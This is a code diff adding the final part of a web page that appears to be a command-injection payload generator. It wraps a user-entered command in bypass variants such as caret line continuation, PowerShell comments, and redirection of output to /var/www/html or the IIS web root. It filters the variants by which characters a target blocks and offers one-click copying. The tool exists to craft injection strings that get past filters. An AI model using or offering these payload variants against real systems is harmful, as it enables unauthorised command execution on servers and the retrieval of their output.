+    { name: 'CMD: Caret Newline', desc: 'Caret escapes newline for multi-line CMD', cmd: fullCmd.split(' ').join(' ^\n'), os: 'windows', needs: [], win: 'cmd' },
+    { name: 'PS: # Comment', desc: 'PowerShell comment', cmd: `${fullCmd} #`, os: 'windows', needs: [], win: 'ps' },
+    { name: 'PS: <# Block Comment #>', desc: 'PowerShell block comment', cmd: `${fullCmd} <# comment #>`, os: 'windows', needs: ['angle'], win: 'ps' }
+  );
+  cats.push(nullbyte);
+
+  // ========== REDIRECTION & FILE DESCRIPTORS ==========
+  const redirection = { name: 'Redirection & File Descriptors', icon: '🔀', color: 'var(--cyan)', techniques: [] };
+  redirection.techniques.push(
+    { name: 'Redirect stdout to file', desc: 'Write output to a web-accessible file', cmd: `${fullCmd} > /var/www/html/out.txt`, os: 'linux', needs: ['angle','slash'] },
+    { name: 'Redirect append', desc: 'Append output to file', cmd: `${fullCmd} >> /tmp/out.txt`, os: 'linux', needs: ['angle','slash'] },
+    { name: 'Tee Output', desc: 'Duplicate output to file and stdout', cmd: `${fullCmd} | tee /tmp/out.txt`, os: 'linux', needs: ['pipe','slash'] },
+    { name: 'Stderr Redirect', desc: 'Capture stderr for error-based injection', cmd: `${fullCmd} 2>&1`, os: 'linux', needs: ['angle','ampersand'] },
+    { name: 'CMD: Redirect >', desc: 'Write output to file on Windows', cmd: `${fullCmd} > %TEMP%\\out.txt`, os: 'windows', needs: ['angle','percent','slash'], win: 'cmd' },
+    { name: 'CMD: Append >>', desc: 'Append output to file', cmd: `${fullCmd} >> %TEMP%\\out.txt`, os: 'windows', needs: ['angle','percent','slash'], win: 'cmd' },
+    { name: 'CMD: Stderr 2>&1', desc: 'Redirect stderr to stdout in CMD', cmd: `${fullCmd} 2>&1`, os: 'windows', needs: ['angle','ampersand'], win: 'cmd' },
+    { name: 'CMD: Web Root', desc: 'Write to IIS web root', cmd: `${fullCmd} > C:\\inetpub\\wwwroot\\out.txt`, os: 'windows', needs: ['angle','slash'], win: 'cmd' },
+    { name: 'PS: Out-File', desc: 'PowerShell file output', cmd: `${fullCmd} | Out-File $env:TEMP\\out.txt`, os: 'windows', needs: ['pipe','dollar'], win: 'ps' },
+    { name: 'PS: Set-Content', desc: 'PowerShell Set-Content', cmd: `${fullCmd} | Set-Content $env:TEMP\\out.txt`, os: 'windows', needs: ['pipe','dollar'], win: 'ps' }
+  );
+  cats.push(redirection);
+
+  // Recompute needs from actual command text
+  cats.forEach(cat => cat.techniques.forEach(t => { t.needs = computeNeeds(t.cmd); }));
+
+  return cats;
+}
+
+function shouldShow(technique) {
+  if (currentOS === 'linux' && technique.os === 'windows') return false;
+  if (currentOS === 'windows' && technique.os === 'linux') return false;
+  if (technique.needs) { for (const need of technique.needs) { if (activeFilters.has(need)) return false; } }
+  return true;
+}
+
+function generate() {
+  const cmd = document.getElementById('cmdInput').value.trim();
+  if (!cmd) { showToast('⚠️ Enter a command first'); return; }
+  const cats = generateTechniques(cmd); const resultsEl = document.getElementById('results'); resultsEl.innerHTML = '';
+  let totalTech = 0; let totalCats = 0;
+  cats.forEach((cat, ci) => {
+    const filtered = cat.techniques.filter(shouldShow); if (filtered.length === 0) return;
+    totalCats++; totalTech += filtered.length;
+    const catEl = document.createElement('div'); catEl.className = 'category open'; catEl.style.animationDelay = `${ci * 0.05}s`; catEl.dataset.category = cat.name;
+    let techHTML = '';
+    filtered.forEach(t => {
+      let tags = '';
+      if (t.os === 'linux' || t.os === 'both') tags += '<span class="tag tag-linux">Linux</span>';
+      if (t.os === 'windows' || t.os === 'both') { tags += '<span class="tag tag-windows">Windows</span>'; if (t.win === 'cmd') tags += '<span class="tag tag-cmd">CMD</span>'; if (t.win === 'ps') tags += '<span class="tag tag-ps">PS</span>'; }
+      if (t.blind) tags += '<span class="tag tag-blind">Blind</span>'; if (t.oob) tags += '<span class="tag tag-oob">OOB</span>';
+      const escapedCmd = escapeHtml(t.cmd);
+      const escapedName = escapeHtml(t.name);
+      const escapedDesc = escapeHtml(t.desc);
+      techHTML += `<div class="technique" data-name="${escapeHtml(t.name.toLowerCase())}" data-desc="${escapeHtml(t.desc.toLowerCase())}"><div class="technique-header"><span class="technique-name">${escapedName}</span><div class="technique-tags">${tags}</div></div><div class="technique-desc">${escapedDesc}</div><div class="cmd-block"><div class="cmd-text">${escapedCmd}</div><button class="btn-copy" onclick="copyCmd(this, this.parentElement.querySelector('.cmd-text').textContent)">📋 Copy</button></div></div>`;
+    });
+    catEl.innerHTML = `<div class="category-header" onclick="toggleCategory(this)"><div class="category-title-group"><div class="category-icon" style="background:${cat.color}22;color:${cat.color}">${cat.icon}</div><div><div class="category-title">${cat.name}</div><div class="category-count">${filtered.length} technique${filtered.length !== 1 ? 's' : ''}</div></div></div><span class="chevron">▼</span></div><div class="category-body"><div class="technique-list">${techHTML}</div></div>`;
+    resultsEl.appendChild(catEl);
+  });
+  if (totalTech === 0) { resultsEl.innerHTML = `<div class="empty-state"><div class="icon">🔒</div><p>No techniques match your current filters. Try unblocking some characters.</p></div>`; }
+  document.getElementById('statsBar').style.display = 'flex'; document.getElementById('statCount').textContent = totalTech; document.getElementById('statCats').textContent = totalCats; document.getElementById('searchWrapper').style.display = 'block';
+  filterResults();
+}
+function toggleCategory(header) { header.parentElement.classList.toggle('open'); }
+function copyCmd(btn, text) {
+  const textarea = document.createElement('textarea'); textarea.innerHTML = text; const decoded = textarea.value;
+  navigator.clipboard.writeText(decoded).then(() => { btn.innerHTML = '✅ Copied'; btn.classList.add('copied'); showToast('📋 Copied to clipboard'); setTimeout(() => { btn.innerHTML = '📋 Copy'; btn.classList.remove('copied'); }, 2000); });
+}
+function showToast(msg) { const existing = document.querySelector('.toast'); if (existing) existing.remove(); const toast = document.createElement('div'); toast.className = 'toast'; toast.textContent = msg; document.body.appendChild(toast); setTimeout(() => toast.remove(), 2200); }
+function filterResults() { const query = document.getElementById('searchInput').value.toLowerCase(); document.querySelectorAll('.technique').forEach(el => { const name = el.dataset.name || ''; const desc = el.dataset.desc || ''; el.style.display = (name.includes(query) || desc.includes(query)) ? '' : 'none'; }); }
+document.getElementById('cmdInput').addEventListener('keydown', e => { if (e.key === 'Enter') generate(); });
+</script>
+</body>
+</html>
